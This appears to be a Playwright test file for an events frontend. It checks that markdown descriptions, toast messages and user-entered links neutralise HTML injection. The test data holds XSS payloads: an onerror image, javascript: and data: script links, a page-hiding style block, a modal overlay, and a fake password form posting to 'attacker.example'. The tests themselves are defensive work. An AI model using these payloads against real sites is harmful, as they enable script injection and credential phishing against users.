import type { Page } from '@playwright/test';
import { test, expect, loginInBrowser, moveToModule } from '../support/api.ts';

// Each payload sets window.__injected when it gets to run.
const injected = (page: Page): Promise<unknown> => page.evaluate(() => (window as unknown as { __injected?: unknown }).__injected);

test.describe('HTML injection in the frontend', () => {
    test('markdown keeps formatting but drops scripts, styles and forms', moveToModule('frontend', 'once the frontend has component tests for the markdown filter'), async ({ api, page }) => {
        const description = [
            'Intro with **bold text** and a [normal link](https://www.aegee.org).',
            '',
            '<img src="x" onerror="window.__injected = \'img\'">',
            '',
            '<style>body { display: none !important; }</style>',
            '',
            '<form action="https://attacker.example/login"><input name="password" type="password"><button>Log in again</button></form>',
            '',
            '<p style="position: fixed; inset: 0; background: white;">Covering the page</p>',
            '',
            '<div class="modal is-active"><div class="modal-background"></div><div class="modal-content box">Session expired</div></div>',
            '',
            '[click me](javascript:window.__injected=\'link\')',
            '',
            '[mail the board](mailto:board@example.org) or [download it](ftp://example.org/file)'
        ].join('\n');

        const event = await api.createEvent('admin', { type: 'training', description });
        await api.publishAsAdmin(event.id);

        await loginInBrowser(page, api, 'member');
        await page.goto(`/events/${event.url}`);

        // The description on the event page: the cell next to its row header.
        const rendered = page.getByRole('row')
            .filter({ has: page.getByRole('rowheader', { name: 'Description', exact: true }) })
            .getByRole('cell');
        await expect(rendered.getByText('Intro with')).toBeVisible();

        // Markdown itself still works.
        await expect(rendered.locator('strong')).toHaveText('bold text');
        await expect(rendered.locator('a[href="https://www.aegee.org"]')).toHaveText('normal link');
        await expect(rendered.getByText('Covering the page')).toBeVisible();

        // Everything that could run code, restyle or cover the page, or fake a form is gone.
        await expect(rendered.locator('img[onerror]')).toHaveCount(0);
        await expect(rendered.locator('style')).toHaveCount(0);
        await expect(rendered.locator('form, input, button')).toHaveCount(0);
        await expect(rendered.locator('[style]')).toHaveCount(0);
        // Classes are dropped too: with Bulma's modal classes this would cover the whole page.
        await expect(rendered.locator('.markdown [class]')).toHaveCount(0);
        await expect(page.locator('.modal.is-active')).toHaveCount(0);
        await expect(rendered.getByText('Session expired')).toBeVisible();
        await expect(rendered.locator('a[href^="javascript:"]')).toHaveCount(0);
        // Only http(s), mailto: and tel: links stay links.
        await expect(rendered.getByText('mail the board')).toHaveAttribute('href', 'mailto:board@example.org');
        await expect(rendered.getByText('download it')).toBeVisible();
        await expect(rendered.getByRole('link', { name: 'download it' })).toHaveCount(0);
        await rendered.getByText('click me').click();
        expect(await injected(page)).toBeUndefined();
    });

    test('toasts show names and server messages as text', moveToModule('frontend', 'once the frontend has component tests for the toast helpers'), async ({ api, page }) => {
        await loginInBrowser(page, api, 'member');
        await page.goto('/');
        await expect(page.locator('#app')).toBeVisible();

        const payload = '<img src="x" onerror="window.__injected = true">';
        // Calls one of the toast helpers of the app's root instance (src/methods/index.js).
        const callRootHelper = (name: string, args: unknown[]) => page.evaluate(([helper, helperArgs]) => {
            const root = (document.querySelector('#app') as unknown as { __vue__: { $root: Record<string, (...a: unknown[]) => void> } }).__vue__.$root;
            root[helper as string](...(helperArgs as unknown[]));
        }, [name, args] as const);

        // A success toast with a user-provided name.
        await callRootHelper('showSuccess', [`Event "${payload}" is successfully added.`]);
        await expect(page.getByText(`Event "${payload}" is successfully added.`)).toBeVisible();

        // An error toast with the message from the API response.
        await callRootHelper('showError', ['Could not save event', { response: { data: { message: payload } } }]);
        await expect(page.getByText(`Could not save event: ${payload}`)).toBeVisible();

        await expect(page.locator('.notices img')).toHaveCount(0);
        expect(await injected(page)).toBeUndefined();
    });

    test('links typed in by users only open when they are http(s) links', moveToModule('frontend', 'once the frontend has component tests for the safeUrl filter'), async ({ api, page }) => {
        const event = await api.createEvent('admin', { type: 'training' });
        await api.publishAsAdmin(event.id);

        // The backend rejects links like these, so they're put in the API responses
        // to test the frontend on its own (and data stored before the validation).
        const replaceInResponse = (url: RegExp, changes: Record<string, string>) => page.route(url, async (route) => {
            if (route.request().method() !== 'GET') {
                return route.fallback();
            }

            const response = await route.fetch();
            const json = await response.json();
            Object.assign(json.data, changes);
            return route.fulfill({ response, json });
        });

        await replaceInResponse(/\/api\/events\/single\/[^/?]+$/, {
            // eslint-disable-next-line no-script-url -- the injected link is what the test checks
            budget: 'javascript:window.__injected=\'budget\'',
            programme: 'www.aegee.org/programme',
            link_info_travel_country: ' data:text/html,<script>window.__injected=\'travel\'</script>'
        });

        await loginInBrowser(page, api, 'member');
        await page.goto(`/events/${event.url}`);

        // The text stays visible, but not as a link: these open in a new tab, so clicking them
        // wouldn't show anything here; without a link (an <a> without href isn't one), there's
        // nothing to open.
        const budget = 'window.__injected=\'budget\'';
        await expect(page.getByText(budget)).toBeVisible();
        await expect(page.getByRole('link', { name: budget })).toHaveCount(0);

        const travel = 'window.__injected=\'travel\'';
        await expect(page.getByText(travel)).toBeVisible();
        await expect(page.getByRole('link', { name: travel })).toHaveCount(0);

        // A link without a scheme opens as https instead of as a page of MyAEGEE.
        await expect(page.getByRole('link', { name: 'www.aegee.org/programme' })).toHaveAttribute('href', 'https://www.aegee.org/programme');
    });
});
